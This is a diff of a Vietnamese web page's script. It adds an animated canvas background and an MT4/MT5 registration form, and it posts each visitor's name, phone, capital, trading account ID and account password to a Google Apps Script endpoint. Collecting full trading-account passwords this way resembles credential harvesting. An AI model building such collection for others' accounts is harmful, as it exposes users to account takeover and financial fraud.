+      ctx.beginPath();
+      ctx.moveTo(a.x, a.y);
+      ctx.lineTo(b.x, b.y);
+      ctx.strokeStyle = `rgba(${color},${alpha})`;
+      ctx.lineWidth = (a.type==="hub"||b.type==="hub") ? 0.8 : 0.4;
+      ctx.stroke();
 
-      const payload = {
-        name:      document.getElementById("fullname").value.trim(),
-        phone:     document.getElementById("phone").value.trim(),
-        platform:  document.getElementById("platform").value,
-        capital:   document.getElementById("capital").value.trim(),
-        accountId: document.getElementById("accountId").value.trim(),
-        password:  document.getElementById("password").value,
-      };
-
-      setLoading(true);
-
-      try {
-        const res  = await fetch(GAS_URL, {
-          method: "POST",
-          body:   JSON.stringify(payload),
-        });
-        const data = await res.json();
-
-        if (data.success) {
-          showSuccess();
-          form.reset();
-        } else {
-          showError(data.message || "Server báo lỗi. Thử lại sau.");
-        }
-      } catch (err) {
-        console.error(err);
-        showError("Không thể kết nối server. Kiểm tra mạng và thử lại.");
-      } finally {
-        setLoading(false);
+      /* data packet travelling along edge */
+      if (Math.random() < 0.0008) {
+        const t = (Date.now() % 2000) / 2000;
+        const px = a.x + (b.x - a.x) * t;
+        const py = a.y + (b.y - a.y) * t;
+        ctx.beginPath();
+        ctx.arc(px, py, 1.5, 0, Math.PI*2);
+        ctx.fillStyle = `rgba(${CYAN},0.8)`;
+        ctx.fill();
       }
-    });
-  </script>
+    }
+  }
 
+  /* nodes */
+  for (const n of nodes) {
+    const glow = 0.6 + 0.4 * Math.sin(n.pulse);
+
+    if (n.type === "hub") {
+      /* outer ring */
+      ctx.beginPath();
+      ctx.arc(n.x, n.y, n.r * 3.5, 0, Math.PI*2);
+      ctx.strokeStyle = `rgba(${GOLD},${0.12 * glow})`;
+      ctx.lineWidth = 1;
+      ctx.stroke();
+      /* core */
+      ctx.beginPath();
+      ctx.arc(n.x, n.y, n.r * 1.6, 0, Math.PI*2);
+      ctx.fillStyle = `rgba(${GOLD},${0.7 * glow})`;
+      ctx.fill();
+      /* halo */
+      const grad = ctx.createRadialGradient(n.x, n.y, 0, n.x, n.y, n.r * 6);
+      grad.addColorStop(0, `rgba(${GOLD},${0.08 * glow})`);
+      grad.addColorStop(1, "transparent");
+      ctx.beginPath();
+      ctx.arc(n.x, n.y, n.r * 6, 0, Math.PI*2);
+      ctx.fillStyle = grad;
+      ctx.fill();
+    } else {
+      ctx.beginPath();
+      ctx.arc(n.x, n.y, n.r, 0, Math.PI*2);
+      ctx.fillStyle = `rgba(${GOLD},${0.45 * glow})`;
+      ctx.fill();
+    }
+  }
+
+  animId = requestAnimationFrame(draw);
+}
+
+window.addEventListener("resize", () => { cancelAnimationFrame(animId); resize(); draw(); });
+resize();
+draw();
+
+/* ── PLATFORM TOGGLE ── */
+document.getElementById("btn4").addEventListener("click", () => {
+  document.getElementById("platform").value = "MT4";
+  document.getElementById("btn4").classList.add("on");
+  document.getElementById("btn5").classList.remove("on");
+});
+document.getElementById("btn5").addEventListener("click", () => {
+  document.getElementById("platform").value = "MT5";
+  document.getElementById("btn5").classList.add("on");
+  document.getElementById("btn4").classList.remove("on");
+});
+
+/* ── PASSWORD ── */
+const pwInp = document.getElementById("password");
+document.getElementById("pwBtn").addEventListener("click", () => {
+  const show = pwInp.type === "password";
+  pwInp.type = show ? "text" : "password";
+  document.getElementById("eyeI").innerHTML = show
+    ? `<path d="M17.94 17.94A10 10 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+       <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+       <line x1="1" y1="1" x2="23" y2="23"/>`
+    : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+});
+
+/* ── VALIDATION & SUBMIT ── */
+function setErr(id, on) {
+  document.getElementById(id).classList.toggle("err", on);
+  document.getElementById("err-" + id).classList.toggle("show", on);
+}
+["fullname","phone","accountId"].forEach(id =>
+  document.getElementById(id).addEventListener("input", () => setErr(id, false))
+);
+
+function validate() {
+  let ok = true;
+  ["fullname","phone","accountId"].forEach(id => {
+    const v = document.getElementById(id).value.trim();
+    setErr(id, !v); if (!v) ok = false;
+  });
+  return ok;
+}
+
+const subBtn = document.getElementById("subBtn");
+const tOk   = document.getElementById("tOk");
+const tFail = document.getElementById("tFail");
+const tMsg  = document.getElementById("tMsg");
+
+document.getElementById("regForm").addEventListener("submit", async e => {
+  e.preventDefault();
+  tOk.className = tFail.className = "toast";
+  if (!validate()) return;
+
+  subBtn.disabled = true;
+  subBtn.innerHTML = `<span class="spinner"></span>Đang kết nối...`;
+
+  const payload = {
+    name:      document.getElementById("fullname").value.trim(),
+    phone:     document.getElementById("phone").value.trim(),
+    platform:  document.getElementById("platform").value,
+    capital:   document.getElementById("capital").value.trim(),
+    accountId: document.getElementById("accountId").value.trim(),
+    password:  document.getElementById("password").value,
+  };
+
+  try {
+    const res  = await fetch(GAS_URL, { method: "POST", body: JSON.stringify(payload) });
+    const data = await res.json();
+    if (data.success) {
+      tOk.className = "toast ok";
+      document.getElementById("regForm").reset();
+      document.getElementById("btn4").classList.add("on");
+      document.getElementById("btn5").classList.remove("on");
+      document.getElementById("platform").value = "MT4";
+    } else {
+      tMsg.textContent = data.message || "Server báo lỗi.";
+      tFail.className = "toast fail";
+    }
+  } catch {
+    tMsg.textContent = "Không thể kết nối. Kiểm tra mạng.";
+    tFail.className = "toast fail";
+  } finally {
+    subBtn.disabled = false;
+    subBtn.innerHTML = "Kết nối &amp; Đăng ký";
+  }
+});
+</script>
 </body>
 </html>
